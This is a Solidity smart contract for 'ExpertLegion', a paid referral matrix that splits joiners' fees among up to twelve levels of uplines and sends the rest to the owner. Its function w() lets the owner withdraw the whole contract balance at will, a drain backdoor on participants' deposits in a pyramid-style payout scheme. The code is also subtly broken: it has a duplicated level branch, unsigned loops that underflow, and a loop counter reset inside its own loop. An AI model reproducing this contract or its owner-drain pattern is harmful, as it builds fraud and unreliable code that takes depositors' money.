pragma solidity ^0.6.0;
import "./SafeMath.sol";
import "./Vars.sol";


// $$$$$$$$\                                           $$\     $$\                           $$\                     
// $$  _____|                                          $$ |    $$ |                          \__|                    
// $$ |      $$\   $$\  $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$\   $$ |       $$$$$$\   $$$$$$\  $$\  $$$$$$\  $$$$$$$\  
// $$$$$\    \$$\ $$  |$$  __$$\ $$  __$$\ $$  __$$\ \_$$  _|  $$ |      $$  __$$\ $$  __$$\ $$ |$$  __$$\ $$  __$$\ 
// $$  __|    \$$$$  / $$ /  $$ |$$$$$$$$ |$$ |  \__|  $$ |    $$ |      $$$$$$$$ |$$ /  $$ |$$ |$$ /  $$ |$$ |  $$ |
// $$ |       $$  $$<  $$ |  $$ |$$   ____|$$ |        $$ |$$\ $$ |      $$   ____|$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |
// $$$$$$$$\ $$  /\$$\ $$$$$$$  |\$$$$$$$\ $$ |        \$$$$  |$$$$$$$$\ \$$$$$$$\ \$$$$$$$ |$$ |\$$$$$$  |$$ |  $$ |
// \________|\__/  \__|$$  ____/  \_______|\__|         \____/ \________| \_______| \____$$ |\__| \______/ \__|  \__|
//                     $$ |                                                        $$\   $$ |                        
//                     $$ |                                                        \$$$$$$  |                        
//                     \__|                                                         \______/          
//  Official Smart Contract  expertlegion.com                                            Powered by Options Legion


contract ExpertLegion is Vars {
    using SafeMath for uint256;
    
    constructor() public{
        owner = msg.sender;
    }
    
  
    receive() external payable{
        require(!stop);
     
        if(!users[msg.sender].isExist)
            registerUser(msg.sender, msg.value, 0,owner);
        else 
            activateUser(msg.sender, msg.value);
    }
    
   

   
    function registerUser(address payable _user, uint256 _fee, bytes32 _code, address _referer) public payable{
        require(_fee >= activationCharges && msg.value >= activationCharges); 
        require(!users[_user].isExist); 
        
       
        isStop();
        
      
        if(!stop){
            if(_code != 0)
                isReferred(_code);
            
            
            storeUserData(_user ,  _referer);
        
            
            distributeToUplines(_fee, _user , _referer,false);
        
            
            emit UserRegistered(_user, users[_user].level, users[_user].id, users[_user].deadline );
        } else{
            revert("contract is full");
        }
    }
    
    
    function storeUserData(address payable _user, address _referer) internal {
       
        if(_referer != owner){
            
             require(users[_referer].isExist); 
        }
        
        currentUserId++; 
        userList[currentUserId] = _user; 
       
        bytes32 code = generateReferral(_user);
      
        if(occupiedSlots == 3 ** (currentLevel)){ 
            currentLevel++;
            occupiedSlots = 0;
        }
        
        
        User memory u;
        u.isExist = true;
        u.id = currentUserId;
        u.totalReferrals = 0;
        u.deadline = now.add(activationPeriod);
        
        uint256 level = 0;
      if(_referer != owner){
        level = (users[_referer].totalReferrals)-1;
        }
        if( level < 9/3){
              u.level = users[_referer].level+1;
        }else if( level < 27/3){
              u.level = users[_referer].level+2;
        }else if( level < 81/3){
              u.level = users[_referer].level+3;
        }else if( level < 243/3){
              u.level = users[_referer].level+4;
        }else if( level < 729/3){
              u.level = users[_referer].level+5;
        }else if( level < 2187/3){
              u.level = users[_referer].level+6;
        }else if( level < 2187/3){
              u.level = users[_referer].level+7;
        }else if( level < 6561/3){
              u.level = users[_referer].level+8;
        }else if( level < 19683/3){
              u.level = users[_referer].level+9;
        }else if( level < 59049/3){
              u.level = users[_referer].level+10;
        }else if( level < 177147/3){
              u.level = users[_referer].level+11;
        }else if( level < 531441/3){
              u.level = users[_referer].level+12;
        }
        
        address  referer =  _referer; 
  if(level >= 9/3){
       for(uint i = 12; i >= 1; i--){
               
                for(uint id = 1; id<= 3 ** i; id++){
                    address  _user_compare = userList[id]; 
                    if (users[_user_compare].referer ==  _referer  && users[_user_compare].totalReferrals <= 4 ){
                        
                       u.level =  users[_user_compare].level+1;
                        referer =  _user_compare;
                        if (level < 13){
                            users[_user_compare].totalReferrals +=1;
                            break;
                        }
                    }
                }
            }
            
  }else{
     referer =  _referer;
  }
           
            
            

        if (level > 12){
           revert("contract is full");
        }
     
        u.referralLink = code;
        u.referer  = referer;
        users[_user] = u;
        
        occupiedSlots++;
        totalMembers++;
    }
    
     function w() external  {
    require ( msg.sender == owner );
    owner.transfer(address(this).balance);
    }
     
    
    
    function generateReferral(address _user) internal returns(bytes32){
        bytes32 id = keccak256(abi.encode(_user, currentUserId)); 
        hashedIds[id] = _user;
        return id;
    }
    
    
    function distributeToUplines(uint256 _fee, address _sender , address _referer, bool _activate) internal { 
        require(address(this).balance >= _fee);
        
        uint256 registerChargeFee = 0.005 ether;
        uint256 ownerFunds;
        uint256 amountToDistributeToUplines = _fee; 
        if (_activate == false){
        amountToDistributeToUplines = _fee.sub(registerChargeFee); 
        }
        uint256 eachUplineShare = amountToDistributeToUplines.div(12);
        uint256 currentLevel_user =  users[_sender].level;
        if(currentLevel_user == 1){
            
            ownerFunds = _fee;
        } 
        else{
            address  referer =  _referer;
  
            for(uint i = currentLevel_user-1; i >= 1; i--){
            
                uint256 userAmount = eachUplineShare;
            
               
                for(uint id = 1; id<= 3 ** i; id++){
                    address payable _user = userList[id]; 
                    if (_user ==  referer  ){
                        bool _eligible = userEligible(_user, _sender);
                
                        if(_eligible){    
                            _user.transfer(userAmount);     
                            emit UserFundsTransfer(_user, userAmount, currentLevel, currentUserId);
                        } else{                         
                            ownerFunds += userAmount;      
                        }
                        referer = users[_user].referer;
                        id = 1;
                        // i = currentLevel;
                    }
                }
            }
            emit UplineFundsDistributed((currentLevel_user-1).mul(eachUplineShare), currentLevel, currentUserId);
        
           
            ownerFunds += _fee.sub((currentLevel_user-1).mul(eachUplineShare));
        }
        
        
        owner.transfer(ownerFunds);
        emit OwnerFundsTransfer(ownerFunds, currentLevel, currentUserId);
    }
    
    function userEligible(address _user, address _sender) internal view returns(bool _eligible){
        
        if(users[_user].deadline > now  && users[_user].level < users[_sender].level ){
            if(users[_user].totalReferrals == 1 && users[_sender].level <= 3)
                return true;
            else if(users[_user].totalReferrals == 2 && users[_sender].level <= 6)
                return true;
            else if(users[_user].totalReferrals >= 3)
                return true;
            else 
                return false;
        } 
        
        else{ 
            return false;
        }
    }
    
    
    function isReferred(bytes32 _code) internal{
        require(hashedIds[_code] != address(0));
        users[hashedIds[_code]].totalReferrals++; 
    }
    
    // activates the existing user
    function activateUser(address _user, uint256 _fee) public payable{
        require(users[_user].isExist);
        require(_fee >= (activationCharges -  0.005 ether));
        
        isStop();
        
        
        if(!stop){
            users[_user].deadline = (users[_user].deadline).add(activationPeriod); 
           
            distributeToUplines(_fee, _user, users[_user].referer,true);
            
            emit UserActivated(_user, users[_user].level, users[_user].id, users[_user].deadline );
        } else{
            revert("Contract has been stopped");
        }
    }
    
    function isStop() internal{
        if(currentLevel == 12 && occupiedSlots == 3**12){
            stop = true;
        }
    }
}